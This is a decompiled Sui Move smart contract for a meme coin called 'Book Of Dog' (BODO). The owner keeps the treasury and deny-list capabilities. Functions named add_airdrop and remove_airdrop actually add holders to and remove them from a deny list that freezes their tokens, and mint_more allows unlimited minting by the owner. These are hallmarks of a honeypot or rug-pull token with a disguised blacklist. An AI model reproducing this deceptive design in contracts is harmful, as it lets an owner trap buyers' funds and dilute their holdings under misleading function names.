module 0x6f2b55ba91a14b33ebb9001010e225cce7f94d8895b9e5acac6ba2215095bb95::BODO {
    struct BODO has drop {
        dummy_field: bool,
    }

    public entry fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BODO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BODO>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: BODO, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BODO>(arg0, 6, b"BODO", b"Book Of Dog", b"BOOK OF DOG : an experimental project poised to redefine web3 culture by dog memes, decentralized storage solutions and degen shitcoin trading and gambling.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://pump.mypinata.cloud/ipfs/Qmb9QqzsHWXiYs9qGFtDqGu4RGT4jbQ68QvYZaYMftP141?img-width=256&img-dpr=2&img-onerror=redirect")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BODO>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<BODO>>(0x2::coin::mint<BODO>(&mut v3, 10000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<BODO>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BODO>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun mint_more(arg0: &mut 0x2::coin::TreasuryCap<BODO>, arg1: u64, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<BODO>>(0x2::coin::mint<BODO>(arg0, arg1, arg2), 0x2::tx_context::sender(arg2));
    }

    public entry fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BODO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<BODO>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

